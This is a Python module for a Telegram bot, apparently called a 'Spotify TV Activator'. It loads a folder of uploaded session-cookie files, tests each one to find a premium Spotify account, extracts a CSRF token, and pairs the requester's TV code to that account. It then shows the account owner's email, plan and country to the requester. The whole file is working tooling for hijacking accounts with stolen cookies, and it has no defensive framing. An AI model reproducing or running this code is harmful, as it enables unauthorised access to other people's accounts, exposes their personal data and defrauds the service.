# ============================================================
# SPOTIFY TV ACTIVATOR SERVICE - COMPLETE FIXED
# Full cookie parsing, CSRF extraction, and TV activation
# ============================================================

import os
import re
import json
import glob
import random
import uuid
import time
import requests
from typing import Optional, Dict, Tuple
from urllib.parse import urlparse, parse_qs

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler

from config import E, COOKIES_FOLDER
from utils import pe, extract_cookie_dict, update_bot_stats


# ─── Constants ──────────────────────────────────────────────

WAITING_SPOTIFY_CODE = 5

SPOTIFY_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
SPOTIFY_MOBILE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"


# ─── Cookie Parsing for Spotify ─────────────────────────────

def spotify_parse_cookie_file(content: str) -> Optional[Dict]:
    """
    Parse Spotify cookie from various formats.
    Returns a dict of cookies or None if no valid Spotify cookies found.
    """
    cookies = {}
    
    # Try Netscape format
    for line in content.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith('#') and not line.startswith('#HttpOnly_'):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[10:]
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookies[name] = value
    
    # If no cookies found, try JSON
    if not cookies:
        try:
            data = json.loads(content)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str) and len(v) > 5:
                        cookies[k] = v
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and 'name' in item and 'value' in item:
                        cookies[item['name']] = item['value']
        except:
            pass
    
    # If still no cookies, try key-value pairs
    if not cookies:
        for line in content.split('\n'):
            line = line.strip()
            if '=' in line and not line.startswith('#'):
                k, v = line.split('=', 1)
                if len(v) > 5:
                    cookies[k.strip()] = v.strip()
    
    # Check if we have any Spotify-specific cookies
    spotify_cookies = ['sp_t', 'sp_anon', 'sp_ab', 'sp_landing', 'sp_dc', 'sp_oauth']
    found = False
    for name in spotify_cookies:
        if name in cookies:
            found = True
            break
    
    return cookies if found else None


# ─── Account Info Extraction ─────────────────────────────────

def spotify_get_account_info(cookies: Dict) -> Optional[Dict]:
    """
    Get account info from Spotify using cookies.
    Returns plan, email, country, and premium status.
    """
    try:
        url = "https://www.spotify.com/eg-ar/account/subscription/manage/"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,ru;q=0.7',
            'cache-control': 'max-age=0',
            'user-agent': SPOTIFY_USER_AGENT
        }
        
        session = requests.Session()
        session.cookies.update(cookies)
        response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
        
        if response.status_code != 200:
            return None
        
        html = response.text
        
        # Check if it's a valid account page
        if "Don't have an account" in html or "إدارة اشتراكك" in html:
            # Extract plan
            plan_match = re.search(r'"planNameLong":"([^"]*?)","planNameGpb"', html)
            plan = plan_match.group(1) if plan_match else "Unknown"
            
            # Extract email
            email_match = re.search(r'"email":"([^"]+)"', html)
            email = email_match.group(1) if email_match else None
            
            # Extract country
            country_match = re.search(r'"country":"([^"]+)"', html)
            country = country_match.group(1) if country_match else "Unknown"
            
            # Determine if premium
            is_premium = any(x in plan for x in ["Premium", "باقة", "Family", "Duo", "Student"])
            
            return {
                'plan': plan,
                'email': email,
                'country': country,
                'is_premium': is_premium
            }
        
        return None
    except Exception as e:
        return None


# ─── CSRF Token Extraction ──────────────────────────────────

def spotify_get_csrf_token(cookies: Dict) -> Tuple[Optional[str], Optional[str], Optional[Dict]]:
    """
    Get CSRF token and flow context from Spotify's link page.
    This is required for TV activation.
    """
    try:
        session = requests.Session()
        session.cookies.update(cookies)
        
        flow_ctx = f"{uuid.uuid4()}%3A{int(time.time())}"
        url = f"https://accounts.spotify.com/en/link/v2?flow_ctx={flow_ctx}"
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,ru;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': SPOTIFY_MOBILE_UA,
            'referer': 'https://www.spotify.com/'
        }
        
        response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
        
        if response.status_code != 200:
            return None, None, None
        
        html = response.text
        
        # Extract CSRF token
        csrf_token = None
        pattern = r'initialToken":"([^"]+)"'
        match = re.search(pattern, html)
        if match:
            csrf_token = match.group(1)
        
        # Extract flow context
        flow_pattern = r'flow_ctx=([^"\s&]+)'
        flow_match = re.search(flow_pattern, html)
        flow_ctx = flow_match.group(1) if flow_match else flow_ctx
        
        # Update cookies from session
        updated_cookies = cookies.copy()
        for cookie in session.cookies:
            updated_cookies[cookie.name] = cookie.value
        
        return csrf_token, flow_ctx, updated_cookies
    except Exception as e:
        return None, None, None


# ─── TV Activation ───────────────────────────────────────────

def spotify_activate_tv(cookies: Dict, code: str, csrf: str, flow: str) -> Tuple[bool, str, Optional[str]]:
    """
    Activate a TV device using the 6-digit code.
    Returns (success, status, tv_name).
    """
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,ru;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://accounts.spotify.com',
            'referer': f'https://accounts.spotify.com/en/link/v2?flow_ctx={flow}',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': SPOTIFY_MOBILE_UA
        }
        
        if csrf:
            headers['x-csrf-token'] = csrf
        
        # Step 1: Submit the code
        r1 = requests.post(
            f"https://accounts.spotify.com/pair/api/code?flow_ctx={flow}",
            headers=headers,
            cookies=cookies,
            json={"code": code.upper()},
            timeout=30
        )
        
        if r1.status_code != 200:
            return False, "error", None
        
        data = r1.json()
        
        if data.get('result') == 'invalid':
            return False, "invalid", None
        
        if data.get('result') != 'ok':
            return False, "error", None
        
        # Get TV name
        tv_name = data.get('codeInfo', {}).get('authorizationInfo', {}).get('clientInfo', {}).get('name', 'Unknown TV')
        
        # Step 2: Resolve the code (complete activation)
        r2 = requests.post(
            f"https://accounts.spotify.com/pair/api/resolve?flow_ctx={flow}",
            headers=headers,
            cookies=cookies,
            json={"code": code.upper()},
            timeout=30
        )
        
        if r2.status_code != 200:
            return False, "error", tv_name
        
        result = r2.json().get('result', '')
        
        if result in ['ok', 'success']:
            return True, "success", tv_name
        
        return False, "error", tv_name
    except Exception as e:
        return False, "error", None


# ─── Helper Functions for UI ────────────────────────────────

def cancel_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )]
    ])


def back_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )]
    ])


# ─── Main Processing Function ───────────────────────────────

def spotify_find_and_activate(code: str) -> Tuple[bool, Dict]:
    """
    Find a premium Spotify account and activate the TV.
    Returns (success, result_info).
    """
    cookie_files = glob.glob(f"{COOKIES_FOLDER}/*.txt")
    random.shuffle(cookie_files)
    
    for filepath in cookie_files:
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Parse cookies
            cookies = spotify_parse_cookie_file(content)
            if not cookies:
                continue
            
            # Get account info
            account_info = spotify_get_account_info(cookies)
            if not account_info or not account_info.get('is_premium'):
                continue
            
            # Get CSRF token
            csrf, flow, updated_cookies = spotify_get_csrf_token(cookies)
            if not csrf or not flow:
                continue
            
            # Activate TV
            ok, status, tv_name = spotify_activate_tv(updated_cookies, code, csrf, flow)
            
            if ok:
                return True, {
                    'email': account_info.get('email', 'Unknown'),
                    'plan': account_info.get('plan', 'Unknown'),
                    'country': account_info.get('country', 'Unknown'),
                    'tv_name': tv_name or 'Unknown TV',
                    'cookie_file': os.path.basename(filepath)
                }
        except Exception:
            continue
    
    return False, {}


# ─── Telegram Handlers ───────────────────────────────────────

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the Spotify TV activator conversation."""
    query = update.callback_query
    await query.answer()
    
    cookie_count = len(glob.glob(f"{COOKIES_FOLDER}/*.txt"))
    
    await query.edit_message_text(
        f"{pe(E['globe'])} <b>Spotify TV Activator</b>\n\n"
        f"{pe(E['next'])} Send me the <b>6-digit TV code</b>\n"
        f"{pe(E['bolt'])} from your Spotify TV screen.\n\n"
        f"{pe(E['star'])} <b>Cookies in vault:</b> {cookie_count}\n\n"
        f"{pe(E['warn'])} I will find a premium account and activate your TV.",
        reply_markup=cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_SPOTIFY_CODE


async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the TV code and activate Spotify."""
    code = update.message.text.strip().upper()
    
    if len(code) != 6 or not code.isalnum():
        await update.message.reply_html(
            f"{pe(E['cross'])} Invalid code. Please send a <b>6-digit alphanumeric</b> code.",
            reply_markup=cancel_button()
        )
        return WAITING_SPOTIFY_CODE

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Searching for premium account...\n\n"
        f"{pe(E['hourglass'])} Checking cookies in vault..."
    )

    cookie_count = len(glob.glob(f"{COOKIES_FOLDER}/*.txt"))
    
    if cookie_count == 0:
        await status_msg.edit_text(
            f"{pe(E['cross'])} <b>No cookies found!</b>\n\n"
            f"{pe(E['warn'])} Upload cookies first using <code>/upload</code>",
            reply_markup=back_button(),
            parse_mode="HTML"
        )
        update_bot_stats(False)
        return ConversationHandler.END

    # Update progress
    await status_msg.edit_text(
        f"{pe(E['loading'])} Checking <b>{cookie_count}</b> cookies...\n\n"
        f"{pe(E['hourglass'])} Looking for premium account..."
    )

    # Find and activate
    success, info = spotify_find_and_activate(code)

    if success:
        await status_msg.edit_text(
            f"{pe(E['check'])} <b>🎉 TV Activated Successfully!</b>\n\n"
            f"{pe(E['bolt'])} <b>Email:</b> {info.get('email', 'Unknown')}\n"
            f"{pe(E['star'])} <b>Plan:</b> {info.get('plan', 'Unknown')}\n"
            f"{pe(E['globe'])} <b>Country:</b> {info.get('country', 'Unknown')}\n"
            f"{pe(E['gem'])} <b>TV:</b> {info.get('tv_name', 'Unknown TV')}\n"
            f"{pe(E['sparkle'])} <b>Cookie:</b> {info.get('cookie_file', 'Unknown')}\n\n"
            f"{pe(E['sparkle'])} Your TV is now ready to stream Spotify!",
            reply_markup=back_button()
        )
        update_bot_stats(True)
    else:
        await status_msg.edit_text(
            f"{pe(E['cross'])} <b>Activation Failed.</b>\n\n"
            f"{pe(E['warn'])} <b>Possible reasons:</b>\n"
            f"• No premium Spotify account found\n"
            f"• The TV code is invalid or expired\n"
            f"• All cookies have been used\n\n"
            f"{pe(E['next'])} Try again with a fresh code from your TV screen.",
            reply_markup=back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END